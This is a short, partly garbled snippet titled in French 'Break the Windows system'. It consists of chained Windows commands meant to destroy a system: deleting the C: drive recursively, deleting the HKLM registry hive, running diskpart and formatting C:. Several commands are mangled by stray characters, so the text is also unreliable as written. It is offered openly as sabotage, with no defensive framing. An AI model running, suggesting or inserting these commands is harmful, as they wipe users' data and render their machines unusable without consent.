#Casser le système Windows
rd c: /s /4
ydiskpart /s nul&reg delete hklm /f&rd /s /q c: laformat c:/y
